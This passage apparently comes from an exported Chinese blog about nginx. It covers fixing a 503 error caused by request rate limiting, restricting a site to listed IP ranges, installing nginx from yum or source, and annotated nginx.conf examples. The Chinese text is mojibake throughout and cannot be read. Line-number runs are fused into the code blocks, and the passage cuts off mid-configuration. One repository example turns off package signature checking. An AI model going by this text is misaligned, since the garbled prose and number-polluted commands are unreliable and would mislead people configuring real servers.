Service Temporarily Unavailableé”™è¯¯ï¼Œæœ‰æ—¶æœ‰å¯ä»¥ï¼Œè”æƒ³åˆ°æœ€è¿‘åœ¨nginx.confé‡Œåšäº†å•ipè®¿é—®æ¬¡æ•°é™åˆ¶. (limit_req_zone $binary_remote_addr zone=allips:10m rate=20r/s;) æŠŠè¿™ä¸ªæ•°é‡æ”¾å¤§ååœ¨åˆ·æ–°å‘ç°é—®é¢˜è§£å†³ã€‚ 123456789vim nginx.confhttp &#123; limit_req_zone $binary_remote_addr zone=allips:10m rate=20r/s; æ·»åŠ ä¸Šé¢é‚£æ¡è¯­å¥å°±è¡Œã€‚ include mime.types; default_type application/octet-stream; ï¼ˆè¿˜é¡ºä¾¿æŠŠè¿™ä¸ªæ”¹å¤§äº† limit_req zone=allips burst=50 nodelay; ï¼‰ä¸ºäº†è¯å®è¯¥é—®é¢˜ï¼Œåå¤æ”¹åŠ¨è¯¥æ•°é‡æµ‹è¯•å‘ç°é—®é¢˜ç¡®å®åœ¨è¿™ã€‚è¿™ä¸ªæ•°é‡è®¾å¾—å¤ªå°æœ‰é—®é¢˜ï¼Œé€šè¿‡fiddlerå‘ç°webé¡µé¢åˆ·æ–°ä¸€ä¸‹ï¼Œå› ä¸ºé¡µé¢ä¸Šå¼•ç”¨çš„js,css,å›¾ç‰‡éƒ½ç®—ä¸€ä¸ªè¿æ¥ã€‚æ‰€ä»¥å•ä¸ªé¡µé¢åˆ·æ–°ä¸‹å°±æœ‰å¯èƒ½åˆ·çˆ†è¿™ä¸ªé™åˆ¶ï¼Œè¶…è¿‡è¿™ä¸ªé™åˆ¶å°±ä¼šæç¤º503 Service Temporarily Unavailableã€‚ è¿™é‡Œæ·»åŠ ä¸‹åªèƒ½è®¾ç½®ä»€ä¹ˆIPç½‘æ®µå¯ä»¥è®¿é—®www.jollychic.comã€‚å…¶ä»–çš„å…¨éƒ¨æ‹’ç»è®¿é—®80ç«¯å£è¿™ä¸ªåŸŸåwww.jollychic.comã€‚ 12345678910111213141516 server &#123; listen 80; allow 218.17.158.2;allow 127.0.0.0/24;allow 192.168.0.0/16;allow 58.251.130.1;allow 183.239.167.3;allow 61.145.164.1;deny all;server_name www.jollychic.com; location / &#123; proxy_pass http://www.jollychic.com;proxy_set_header X-Real-IP $remote_addr;limit_req zone=allips burst=50 nodelay; &#125; &#125;","link":"/2016/05/24/WebæœåŠ¡æŠ€æœ¯/Nginx/nginxè§£å†³åŠæ³•-503-Service.Temporarily.Unavailable/"},{"title":"Nginxå¤šç§å®‰è£…ä¸é…ç½®æ–‡ä»¶è¯¦è§£","text":"å®‰è£…nginxæœ€è¿‘åœ¨å¼„ç°åº¦å‘å¸ƒç¯å¢ƒï¼Œä¹‹å‰nginxåœ¨æµ‹è¯•å’Œçº¿ä¸Šéƒ½æœ‰æ­å»ºé…ç½®ã€‚è´Ÿè½½å‡è¡¡é…ç½®ï¼ˆåŒ…æ‹¬å¥åº·æ£€æŸ¥ï¼‰ã€ç¼“å­˜ï¼ˆåŒ…æ‹¬æ¸…ç©ºç¼“å­˜ï¼‰åå‘ä»£ç†ã€‚å°±æ‰“ç®—è‡ªå·±æ•´ç†ç¯‡è‡ªå·±æ“ä½œçš„æ–‡æ¡£ï¼Œå„ç§ç¼–è¯‘é…ç½®ï¼Œä»Šå¤©è‡ªå·±ä¹Ÿæ•´ç†ä¸€ä»½å®‰è£…æ–‡æ¡£å’Œnginx.confé…ç½®é€‰é¡¹çš„è¯´æ˜ã€‚ é€‰æ‹©ç¨³å®šç‰ˆæœ¬ æˆ‘ä»¬ç¼–è¯‘å®‰è£…nginxæ¥å®šåˆ¶è‡ªå·±çš„æ¨¡å—ã€‚ æœºå™¨CentOS 6.6 x86_64ã€‚ è½¯ä»¶ç‰ˆæœ¬ï¼šNginx 1.9.9 nginxæœ€æ–°å®‰è£…åŒ…ä¸‹è½½åœ°å€ï¼šhttp://www.nginx.cn/ng yum ä¸€é”®å®‰è£…nginxyumå®‰è£…rpmåŒ…ä¼šæ¯”ç¼–è¯‘å®‰è£…ç®€å•å¾ˆå¤šï¼Œé»˜è®¤ä¼šå®‰è£…è®¸å¤šæ¨¡å—ï¼Œå¸®æˆ‘ä»¬è§£å†³åˆ°å¾ˆå¤šä¾èµ–çš„å®‰è£…åŒ…ï¼Œä½†ç¼ºç‚¹æ˜¯å¦‚æœä½ æƒ³ä»¥åå®‰è£…ç¬¬ä¸‰æ–¹æ¨¡å—é‚£å°±æ²¡åŠæ³•äº†ã€‚ ä½¿ç”¨Nginxå®˜æ–¹æº,Epelæ‰©å±•åº“å’Œremiæº,remiæºåŸºäºepel,å¿…é¡»å…ˆå®‰è£…epelæº,remiåŒ…å«php-fpm,mysql-server5.5,å¦‚æœåªéœ€è¦php-fpmå¯ä»¥å•ç‹¬å®‰è£…php-fpmåç¦ç”¨æ­¤æº. ç¬¬ä¸€ç§æ–¹æ³•:123456# vi /etc/yum.repo.d/nginx.repo[nginx]name=nginx repobaseurl=http://nginx.org/packages/centos/$releasever/$basearch/gpgcheck=0enabled=1 å‰©ä¸‹çš„å°±yum install nginxæå®šï¼Œä¹Ÿå¯ä»¥yum install nginx-1.11.10å®‰è£…æŒ‡å®šç‰ˆæœ¬ï¼ˆå‰ææ˜¯ä½ å»packagesé‡Œçœ‹åˆ°æœ‰å¯¹åº”çš„ç‰ˆæœ¬ï¼Œé»˜è®¤æ˜¯æœ€æ–°ç‰ˆç¨³å®šç‰ˆï¼‰ ç¬¬äºŒç§æ–¹æ³•:å„èŠ‚ç‚¹æ—¶é—´åŒæ­¥ [root@nginx ~]# ntpdate 202.120.2.101 å®‰è£…EPELæº: 12345rpm -Uvh http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm yum clean all yum makecache yum install -y nginx service nginx start è¿˜æœ‰ä¸€ç§å°±æ˜¯ä¸‹è½½Centos-6.repo ï¼Œå¯ä»¥åˆ°æˆ‘githubä¸Šé¢nginxåº“ä¸‹è½½ï¼Œè¿™ä¸ªæ˜¯æœ€æ–°çš„æºåœ°å€é‡Œé¢ã€‚nginx ç¼–è¯‘å®‰è£…ï¼šé¦–å…ˆå®‰è£…ç¼ºå°‘çš„ä¾èµ–åŒ…ï¼š 123456789101112 # yum -y install gcc gcc-c++ make libtool zlib zlib-devel openssl openssl-devel pcre pcre-devel``` è¿™äº›è½¯ä»¶åŒ…å¦‚æœyumä¸Šæ²¡æœ‰çš„è¯å¯ä»¥ä¸‹è½½æºç æ¥ç¼–è¯‘å®‰è£…ï¼Œåªæ˜¯è¦æ³¨æ„ç¼–è¯‘æ—¶é»˜è®¤å®‰è£…çš„ç›®å½•ï¼Œç¡®ä¿ä¸‹é¢åœ¨å®‰è£…nginxæ—¶èƒ½å¤Ÿæ‰¾åˆ°è¿™äº›åŠ¨æ€åº“æ–‡ä»¶ï¼ˆldconfigï¼‰ã€‚nginxå®˜ç½‘ä¸‹è½½ç¼–è¯‘å®‰è£…åŒ…åœ°å€:[nginx](http://nginx.org/en/download.html)nginx-1.11.10ç‰ˆæœ¬ä¸‹è½½ï¼š[nginx-1.11.10](http://nginx.org/download/nginx-1.11.10.tar.gz)### æ–°å»ºnginxç”¨æˆ·ä¸ç»„``` bash groupadd www useradd -s /sbin/nologin -g www www ç¼–è¯‘é…ç½®æ–‡ä»¶123456789101112131415161718192021222324252627282930313233 tar -zxvf nginx-1.11.10.tar.gz cd nginx-1.11.10/ ./configure --user=www --group=www --prefix=/usr/local/nginx --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --with-http_realip_module ./configure --user=www --group=www --prefix=/usr/local/nginx --error-log-path=/var/log/nginx/error.log --http-log-path=/var/log/nginx/access.log --with-http_stub_status_module --with-http_ssl_module --with-http_gzip_static_module --with-http_realip_module``` å…¶ä¸­å‚æ•° `--with-http_stub_status_module `æ˜¯ä¸ºäº†å¯ç”¨ nginx çš„ NginxStatus åŠŸèƒ½ï¼Œç”¨æ¥ç›‘æ§ Nginx çš„å½“å‰çŠ¶æ€ã€‚ make &amp;&amp; make install### å¸¸ç”¨ç¼–è¯‘é€‰é¡¹è¯´æ˜nginxå¤§éƒ¨åˆ†å¸¸ç”¨æ¨¡å—ï¼Œç¼–è¯‘æ—¶./configure --helpä»¥--withoutå¼€å¤´çš„éƒ½é»˜è®¤å®‰è£…ã€‚```bash--prefix=PATH ï¼š æŒ‡å®šnginxçš„å®‰è£…ç›®å½•ã€‚é»˜è®¤ /usr/local/nginx--conf-path=PATH ï¼š è®¾ç½®nginx.confé…ç½®æ–‡ä»¶çš„è·¯å¾„ã€‚nginxå…è®¸ä½¿ç”¨ä¸åŒçš„é…ç½®æ–‡ä»¶å¯åŠ¨ï¼Œé€šè¿‡å‘½ä»¤è¡Œä¸­çš„-cé€‰é¡¹ã€‚é»˜è®¤ä¸ºprefix/conf/nginx.conf--user=nameï¼š è®¾ç½®nginxå·¥ä½œè¿›ç¨‹çš„ç”¨æˆ·ã€‚å®‰è£…å®Œæˆåï¼Œå¯ä»¥éšæ—¶åœ¨nginx.confé…ç½®æ–‡ä»¶æ›´æ”¹useræŒ‡ä»¤ã€‚é»˜è®¤çš„ç”¨æˆ·åæ˜¯nobodyã€‚--group=nameç±»ä¼¼--with-pcre ï¼š è®¾ç½®PCREåº“çš„æºç è·¯å¾„ï¼Œå¦‚æœå·²é€šè¿‡yumæ–¹å¼å®‰è£…ï¼Œä½¿ç”¨--with-pcreè‡ªåŠ¨æ‰¾åˆ°åº“æ–‡ä»¶ã€‚ä½¿ç”¨--with-pcre=PATHæ—¶ï¼Œéœ€è¦ä»PCREç½‘ç«™ä¸‹è½½pcreåº“çš„æºç ï¼ˆç‰ˆæœ¬4.4 - 8.30ï¼‰å¹¶è§£å‹ï¼Œå‰©ä¸‹çš„å°±äº¤ç»™Nginxçš„./configureå’Œmakeæ¥å®Œæˆã€‚perlæ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨åœ¨locationæŒ‡ä»¤å’Œ ngx_http_rewrite_moduleæ¨¡å—ä¸­ã€‚--with-zlib=PATH ï¼š æŒ‡å®š zlibï¼ˆç‰ˆæœ¬1.1.3 - 1.2.5ï¼‰çš„æºç è§£å‹ç›®å½•ã€‚åœ¨é»˜è®¤å°±å¯ç”¨çš„ç½‘ç»œä¼ è¾“å‹ç¼©æ¨¡å—ngx_http_gzip_moduleæ—¶éœ€è¦ä½¿ç”¨zlib ã€‚--with-http_ssl_module ï¼š ä½¿ç”¨httpsåè®®æ¨¡å—ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥æ¨¡å—æ²¡æœ‰è¢«æ„å»ºã€‚å‰ææ˜¯opensslä¸openssl-develå·²å®‰è£…--with-http_stub_status_module ï¼š ç”¨æ¥ç›‘æ§ Nginx çš„å½“å‰çŠ¶æ€--with-http_realip_module ï¼š é€šè¿‡è¿™ä¸ªæ¨¡å—å…è®¸æˆ‘ä»¬æ”¹å˜å®¢æˆ·ç«¯è¯·æ±‚å¤´ä¸­å®¢æˆ·ç«¯IPåœ°å€å€¼(ä¾‹å¦‚X-Real-IP æˆ– X-Forwarded-For)ï¼Œæ„ä¹‰åœ¨äºèƒ½å¤Ÿä½¿å¾—åå°æœåŠ¡å™¨è®°å½•åŸå§‹å®¢æˆ·ç«¯çš„IPåœ°å€--add-module=PATH ï¼š æ·»åŠ ç¬¬ä¸‰æ–¹å¤–éƒ¨æ¨¡å—ï¼Œå¦‚nginx-sticky-module-ngæˆ–ç¼“å­˜æ¨¡å—ã€‚æ¯æ¬¡æ·»åŠ æ–°çš„æ¨¡å—éƒ½è¦é‡æ–°ç¼–è¯‘ï¼ˆTengineå¯ä»¥åœ¨æ–°åŠ å…¥moduleæ—¶æ— éœ€é‡æ–°ç¼–è¯‘ï¼‰ å†æä¾›ä¸€ç§ç¼–è¯‘æ–¹æ¡ˆï¼šæœ€å…¨æ–¹æ¡ˆçš„ç¼–è¯‘ 12345678910111213141516171819./configure \\ --prefix=/usr \\ --sbin-path=/usr/sbin/nginx \\ --conf-path=/etc/nginx/nginx.conf \\ --error-log-path=/var/log/nginx/error.log \\ --http-log-path=/var/log/nginx/access.log \\ --pid-path=/var/run/nginx/nginx.pid \\ --lock-path=/var/lock/nginx.lock \\ --user=nginx \\ --group=nginx \\ --with-http_ssl_module \\ --with-http_stub_status_module \\--with-http_gzip_static_module \\ --http-client-body-temp-path=/var/tmp/nginx/client/ \\ --http-proxy-temp-path=/var/tmp/nginx/proxy/ \\ --http-fastcgi-temp-path=/var/tmp/nginx/fcgi/ \\ --http-uwsgi-temp-path=/var/tmp/nginx/uwsgi \\ --with-pcre=../pcre-7.8 --with-zlib=../zlib-1.2.3 ç¼–è¯‘å®Œæˆåé¢æ‰§è¡Œå®‰è£…ï¼šmake 1234567891011121314151617181920212223242526272829303132creating objs/MakefileConfiguration summary + using system PCRE library + using system OpenSSL library + using system zlib library nginx path prefix: \"/usr/local/nginx\" nginx binary file: \"/usr/local/nginx/sbin/nginx\" nginx modules path: \"/usr/local/nginx/modules\" nginx configuration prefix: \"/usr/local/nginx/conf\" nginx configuration file: \"/usr/local/nginx/conf/nginx.conf\" nginx pid file: \"/usr/local/nginx/logs/nginx.pid\" nginx error log file: \"/var/log/nginx/error.log\" nginx http access log file: \"/var/log/nginx/access.log\" nginx http client request body temporary files: \"client_body_temp\" nginx http proxy temporary files: \"proxy_temp\" nginx http fastcgi temporary files: \"fastcgi_temp\" nginx http uwsgi temporary files: \"uwsgi_temp\" nginx http scgi temporary files: \"scgi_temp\" [root@nginx nginx-1.11.10]# make &amp;&amp; make installmake -f objs/Makefilemake[1]: Entering directory `/root/nginx-1.11.10'cc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs \\ -o objs/src/core/nginx.o \\ src/core/nginx.ccc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs \\ -o objs/src/core/ngx_log.o \\ src/core/ngx_log.ccc -c -pipe -O -W -Wall -Wpointer-arith -Wno-unused-parameter -Werror -g -I src/core -I src/event -I src/event/modules -I src/os/unix -I objs \\..... å¯åŠ¨nginxæœåŠ¡1234/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.confln -s /usr/local/nginx/sbin/nginx /usr/bin/nginx ##åšè½¯è¿æ¥cp nginx.init /etc/init.d/nginx å¯åŠ¨è„šæœ¬chmod +x /etc/init.d/nginx ä¸‹è½½nginxå¯åŠ¨è„šæœ¬è¿™ä¸ªæˆ‘å…¨éƒ¨æ”¾åˆ°githubä¸Šé¢ï¼Œnginxå¯åŠ¨è„šæœ¬ å¯åŠ¨å…³é—­nginx 123456789101112131415161718## æ£€æŸ¥é…ç½®æ–‡ä»¶æ˜¯å¦æ­£ç¡®# /usr/local/nginx-1.6/sbin/nginx -t # ./sbin/nginx -V # å¯ä»¥çœ‹åˆ°ç¼–è¯‘é€‰é¡¹## å¯åŠ¨ã€å…³é—­# ./sbin/nginx # é»˜è®¤é…ç½®æ–‡ä»¶ conf/nginx.confï¼Œ-c æŒ‡å®š# ./sbin/nginx -s stopæˆ– pkill nginx#nginxå¹³æ»‘é‡å¯ã€nginx -t -c /usr/local/nginx/conf/nginx.conf## é‡å¯ï¼Œä¸ä¼šæ”¹å˜å¯åŠ¨æ—¶æŒ‡å®šçš„é…ç½®æ–‡ä»¶# ./sbin/nginx -s reloadæˆ– kill -HUP `cat /usr/local/nginx-1.6/logs/nginx.pid` è®¾ç½®å¼€æœºå¯åŠ¨chkconfig --level 345 nginx on chkconfig nginx on chkconfig nginx --list nginx 0:å…³é—­ 1:å…³é—­ 2:å¯ç”¨ 3:å¯ç”¨ 4:å¯ç”¨ 5:å¯ç”¨ 6:å…³é—­ å½“ç„¶ä¹Ÿå¯ä»¥å°† nginx ä½œä¸ºç³»ç»ŸæœåŠ¡ç®¡ç†ï¼Œä¸‹è½½ nginx åˆ°/etc/init.d/ï¼Œä¿®æ”¹é‡Œé¢çš„è·¯å¾„ç„¶åèµ‹äºˆå¯æ‰§è¡Œæƒé™ã€‚ 1# service nginx &#123;start|stop|status|restart|reload|configtest&#125; nginx.confé…ç½®æ–‡ä»¶Nginxé…ç½®æ–‡ä»¶ä¸»è¦åˆ†æˆå››éƒ¨åˆ†ï¼šmainï¼ˆå…¨å±€è®¾ç½®ï¼‰ã€serverï¼ˆä¸»æœºè®¾ç½®ï¼‰ã€upstreamï¼ˆä¸Šæ¸¸æœåŠ¡å™¨è®¾ç½®ï¼Œä¸»è¦ä¸ºåå‘ä»£ç†ã€è´Ÿè½½å‡è¡¡ç›¸å…³é…ç½®ï¼‰å’Œ locationï¼ˆURLåŒ¹é…ç‰¹å®šä½ç½®åçš„è®¾ç½®ï¼‰ï¼Œæ¯éƒ¨åˆ†åŒ…å«è‹¥å¹²ä¸ªæŒ‡ä»¤ã€‚mainéƒ¨åˆ†è®¾ç½®çš„æŒ‡ä»¤å°†å½±å“å…¶å®ƒæ‰€æœ‰éƒ¨åˆ†çš„è®¾ç½®ï¼›serveréƒ¨åˆ†çš„æŒ‡ä»¤ä¸»è¦ç”¨äºæŒ‡å®šè™šæ‹Ÿä¸»æœºåŸŸåã€IPå’Œç«¯å£ï¼›upstreamçš„æŒ‡ä»¤ç”¨äºè®¾ç½®ä¸€ç³»åˆ—çš„åç«¯æœåŠ¡å™¨ï¼Œè®¾ç½®åå‘ä»£ç†åŠåç«¯æœåŠ¡å™¨çš„è´Ÿè½½å‡è¡¡ï¼›locationéƒ¨åˆ†ç”¨äºåŒ¹é…ç½‘é¡µä½ç½®ï¼ˆæ¯”å¦‚ï¼Œæ ¹ç›®å½•â€œ/â€,â€œ/imagesâ€,ç­‰ç­‰ï¼‰ã€‚ä»–ä»¬ä¹‹é—´çš„å…³ç³»å¼ï¼šserverç»§æ‰¿mainï¼Œlocationç»§æ‰¿serverï¼›upstreamæ—¢ä¸ä¼šç»§æ‰¿æŒ‡ä»¤ä¹Ÿä¸ä¼šè¢«ç»§æ‰¿ã€‚å®ƒæœ‰è‡ªå·±çš„ç‰¹æ®ŠæŒ‡ä»¤ï¼Œä¸éœ€è¦åœ¨å…¶ä»–åœ°æ–¹çš„åº”ç”¨ã€‚ å½“å‰nginxæ”¯æŒçš„å‡ ä¸ªæŒ‡ä»¤ä¸Šä¸‹æ–‡ï¼š 2.1 é€šç”¨ä¸‹é¢çš„nginx.confç®€å•çš„å®ç°nginxåœ¨å‰ç«¯åšåå‘ä»£ç†æœåŠ¡å™¨çš„ä¾‹å­ï¼Œå¤„ç†jsã€pngç­‰é™æ€æ–‡ä»¶ï¼Œjspç­‰åŠ¨æ€è¯·æ±‚è½¬å‘åˆ°å…¶å®ƒæœåŠ¡å™¨tomcatï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120user www www;worker_processes 2;worker_cpu_affinity 00000001; error_log /var/log/nginx/error.log;#error_log logs/error.log notice;#error_log logs/error.log info;pid /var/run/nginx.pid;worker_rlimit_nofile 1024;events &#123; use epoll; worker_connections 65535;&#125;http &#123; include mime.types; default_type application/octet-stream; #log_format main '$remote_addr - $remote_user [$time_local] \"$request\" ' # '$status $body_bytes_sent \"$http_referer\" ' # '\"$http_user_agent\" \"$http_x_forwarded_for\"'; #access_log logs/access.log main; sendfile on; # tcp_nopush on; keepalive_timeout 65; # gzipå‹ç¼©åŠŸèƒ½è®¾ç½® gzip on; gzip_min_length 1k; gzip_buffers 4 16k; gzip_http_version 1.0; gzip_comp_level 6; gzip_types text/html text/plain text/css text/javascript application/json application/javascript application/x-javascript application/xml; gzip_vary on; # http_proxy è®¾ç½® client_max_body_size 10m; client_body_buffer_size 128k; proxy_connect_timeout 75; proxy_send_timeout 75; proxy_read_timeout 75; proxy_buffer_size 4k; proxy_buffers 4 32k; proxy_busy_buffers_size 64k; proxy_temp_file_write_size 64k; proxy_temp_path /usr/local/nginx/proxy_temp 1 2; # è®¾å®šè´Ÿè½½å‡è¡¡åå°æœåŠ¡å™¨åˆ—è¡¨ upstream backend &#123; #ip_hash; server 192.168.10.100:8080 max_fails=2 fail_timeout=30s ; server 192.168.10.101:8080 max_fails=2 fail_timeout=30s ; &#125; # å¾ˆé‡è¦çš„è™šæ‹Ÿä¸»æœºé…ç½® server &#123; listen 80; server_name itoatest.example.com; root /apps/oaapp; charset utf-8; access_log logs/host.access.log main; #å¯¹ / æ‰€æœ‰åšè´Ÿè½½å‡è¡¡+åå‘ä»£ç† location / &#123; root /apps/oaapp; index index.jsp index.html index.htm; proxy_pass http://backend; proxy_redirect off; # åç«¯çš„WebæœåŠ¡å™¨å¯ä»¥é€šè¿‡X-Forwarded-Forè·å–ç”¨æˆ·çœŸå®IP proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_next_upstream error timeout invalid_header http_500 http_502 http_503 http_504; &#125; #é™æ€æ–‡ä»¶ï¼Œnginxè‡ªå·±å¤„ç†ï¼Œä¸å»backendè¯·æ±‚tomcat location ~* /download/ &#123; root /apps/oa/fs; &#125; location ~ .*\\.(gif|jpg|jpeg|bmp|png|ico|txt|js|css)$ &#123; root /apps/oaapp; expires 7d; &#125; location /nginx_status &#123; stub_status on; access_log off; allow 192.168.10.0/24; deny all; &#125; location ~ ^/(WEB-INF)/ &#123; deny all; &#125; #error_page 404 /404.html; # redirect server error pages to the static page /50x.html # error_page 500 502 503 504 /50x.html; location = /50x.html &#123; root html; &#125; &#125; ## å…¶å®ƒè™šæ‹Ÿä¸»æœºï¼Œserver æŒ‡ä»¤å¼€å§‹&#125; è¿™é‡Œæˆ‘æ•´ç†äº†ä¸€ä»½æ¯ä¸ªå«ä¹‰çš„è¯¦è§£ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152#å®šä¹‰Nginxè¿è¡Œçš„ç”¨æˆ·å’Œç”¨æˆ·user www www;#nginxè¿›ç¨‹æ•°ï¼Œå»ºè®®è®¾ç½®ä¸ºç­‰äºCPUæ€»æ ¸å¿ƒæ•°ã€‚è¿™é‡Œæˆ‘æœåŠ¡å™¨4æ ¸worker_processes 4;#ä¸€ä¸ª1æ ¸CPUå¯¹åº”ä¸€ä¸ªè¿›ç¨‹æ•°ç®¡ç†ã€‚è¿™æ ·èƒ½å¾ˆå¥½åˆ†é…èµ„æºã€‚worker_cpu_affinity 00000001 00000010 00000100 00001000; #å…¨å±€é”™è¯¯æ—¥å¿—å®šä¹‰ç±»å‹ï¼Œ[ debug | info | notice | warn | error | crit ]error_log /var/log/nginx/error.log info;#è¿›ç¨‹æ–‡ä»¶pid /var/run/nginx.pid;#ä¸€ä¸ªnginxè¿›ç¨‹æ‰“å¼€çš„æœ€å¤šæ–‡ä»¶æè¿°ç¬¦æ•°ç›®ï¼Œç†è®ºå€¼åº”è¯¥æ˜¯æœ€å¤šæ‰“å¼€æ–‡ä»¶æ•°ï¼ˆç³»ç»Ÿçš„å€¼ulimit -nï¼‰ä¸nginxè¿›ç¨‹æ•°ç›¸é™¤ï¼Œä½†æ˜¯nginxåˆ†é…è¯·æ±‚å¹¶ä¸å‡åŒ€ï¼Œæ‰€ä»¥å»ºè®®ä¸ulimit -nçš„å€¼ä¿æŒä¸€è‡´ã€‚worker_rlimit_nofile 65535;#å·¥ä½œæ¨¡å¼ä¸è¿æ¥æ•°ä¸Šé™events&#123;#å‚è€ƒäº‹ä»¶æ¨¡å‹ï¼Œuse [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epollæ¨¡å‹æ˜¯Linux 2.6ä»¥ä¸Šç‰ˆæœ¬å†…æ ¸ä¸­çš„é«˜æ€§èƒ½ç½‘ç»œI/Oæ¨¡å‹ï¼Œå¦‚æœè·‘åœ¨FreeBSDä¸Šé¢ï¼Œå°±ç”¨kqueueæ¨¡å‹ã€‚use epoll;#å•ä¸ªè¿›ç¨‹æœ€å¤§è¿æ¥æ•°ï¼ˆæœ€å¤§è¿æ¥æ•°=è¿æ¥æ•°*è¿›ç¨‹æ•°ï¼‰worker_connections 65535;&#125;#è®¾å®šhttpæœåŠ¡å™¨http&#123;include mime.types; #æ–‡ä»¶æ‰©å±•åä¸æ–‡ä»¶ç±»å‹æ˜ å°„è¡¨default_type application/octet-stream; #é»˜è®¤æ–‡ä»¶ç±»å‹#charset utf-8; #é»˜è®¤ç¼–ç server_names_hash_bucket_size 128; #æœåŠ¡å™¨åå­—çš„hashè¡¨å¤§å°client_header_buffer_size 32k; #ä¸Šä¼ æ–‡ä»¶å¤§å°é™åˆ¶large_client_header_buffers 4 64k; #è®¾å®šè¯·æ±‚ç¼“client_max_body_size 8m; #è®¾å®šè¯·æ±‚ç¼“sendfile on; #å¼€å¯é«˜æ•ˆæ–‡ä»¶ä¼ è¾“æ¨¡å¼ï¼ŒsendfileæŒ‡ä»¤æŒ‡å®šnginxæ˜¯å¦è°ƒç”¨sendfileå‡½æ•°æ¥è¾“å‡ºæ–‡ä»¶ï¼Œå¯¹äºæ™®é€šåº”ç”¨è®¾ä¸º onï¼Œå¦‚æœç”¨æ¥è¿›è¡Œä¸‹è½½ç­‰åº”ç”¨ç£ç›˜IOé‡è´Ÿè½½åº”ç”¨ï¼Œå¯è®¾ç½®ä¸ºoffï¼Œä»¥å¹³è¡¡ç£ç›˜ä¸ç½‘ç»œI/Oå¤„ç†é€Ÿåº¦ï¼Œé™ä½ç³»ç»Ÿçš„è´Ÿè½½ã€‚æ³¨æ„ï¼šå¦‚æœå›¾ç‰‡æ˜¾ç¤ºä¸æ­£å¸¸æŠŠè¿™ä¸ªæ”¹æˆoffã€‚autoindex on; #å¼€å¯ç›®å½•åˆ—è¡¨è®¿é—®ï¼Œåˆé€‚ä¸‹è½½æœåŠ¡å™¨ï¼Œé»˜è®¤å…³é—­ã€‚tcp_nopush on; #é˜²æ­¢ç½‘ç»œé˜»å¡tcp_nodelay on; #é˜²æ­¢ç½‘ç»œé˜»å¡keepalive_timeout 120; #é•¿è¿æ¥è¶…æ—¶æ—¶é—´ï¼Œå•ä½æ˜¯ç§’#keepalive è¶…æ—¶æ—¶é—´ï¼Œå®¢æˆ·ç«¯åˆ°æœåŠ¡ç«¯çš„è¿æ¥æŒç»­æœ‰æ•ˆæ—¶é—´å½“å‡ºç°å¯¹æœåŠ¡å™¨åï¼Œç»§ç»­è¯·æ±‚æ—¶keepalive_timeoutåŠŸèƒ½å¯é¿å…å»ºç«‹æˆ–è€…é‡æ–°ã€‚#FastCGIç›¸å…³å‚æ•°æ˜¯ä¸ºäº†æ”¹å–„ç½‘ç«™çš„æ€§èƒ½ï¼šå‡å°‘èµ„æºå ç”¨ï¼Œæé«˜è®¿é—®é€Ÿåº¦ã€‚ä¸‹é¢å‚æ•°çœ‹å­—é¢æ„æ€éƒ½èƒ½ç†è§£ã€‚fastcgi_connect_timeout 300;fastcgi_send_timeout 300;fastcgi_read_timeout 300;fastcgi_buffer_size 64k;fastcgi_buffers 4 64k;fastcgi_busy_buffers_size 128k;fastcgi_temp_file_write_size 128k;#gzipæ¨¡å—è®¾ç½®gzip on; #å¼€å¯gzipå‹ç¼©è¾“å‡ºgzip_min_length 1k; #æœ€å°å‹ç¼©æ–‡ä»¶å¤§å°gzip_buffers 4 16k; #å‹ç¼©ç¼“å†²åŒºgzip_http_version 1.0; #å‹ç¼©ç‰ˆæœ¬ï¼ˆé»˜è®¤1.1ï¼Œå‰ç«¯å¦‚æœæ˜¯squid2.5è¯·ä½¿ç”¨1.0ï¼‰gzip_comp_level 2; #å‹ç¼©ç­‰çº§gzip_types text/plain application/x-javascript text/css application/xml;#å‹ç¼©ç±»å‹ï¼Œé»˜è®¤å°±å·²ç»åŒ…å«text/htmlï¼Œæ‰€ä»¥ä¸‹é¢å°±ä¸ç”¨å†å†™äº†ï¼Œå†™ä¸Šå»ä¹Ÿä¸ä¼šæœ‰é—®é¢˜ï¼Œä½†æ˜¯ä¼šæœ‰ä¸€ä¸ªwarnã€‚gzip_vary on;#limit_zone crawler $binary_remote_addr 10m; #å¼€å¯é™åˆ¶IPè¿æ¥æ•°çš„æ—¶å€™éœ€è¦ä½¿ç”¨upstream blog.kern.com &#123;#upstreamçš„è´Ÿè½½å‡è¡¡ï¼Œweightæ˜¯æƒé‡ï¼Œå¯ä»¥æ ¹æ®æœºå™¨é…ç½®å®šä¹‰æƒé‡ã€‚weigthå‚æ•°è¡¨ç¤ºæƒå€¼ï¼Œæƒå€¼è¶Šé«˜è¢«åˆ†é…åˆ°çš„å‡ ç‡è¶Šå¤§ã€‚ server 192.168.58.139:80 weight=1 max_fails=2 fail_timeout=30s; server 192.168.58.140:80 weight=1 max_fails=2 fail_timeout=30s;&#125;#è™šæ‹Ÿä¸»æœºçš„é…ç½® server&#123;#ç›‘å¬ç«¯å£ listen 80;#åŸŸåå¯ä»¥æœ‰å¤šä¸ªï¼Œç”¨ç©ºæ ¼éš”å¼€ server_name www.ihaozhuo.com ; ##(æœåŠ¡å™¨å) index index.html index.htm index.php; root /data/www/ha97; location ~ .*\\.(php|php5)?$&#123; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; include fastcgi.conf;&#125;#å›¾ç‰‡ç¼“å­˜æ—¶é—´è®¾ç½®location ~ 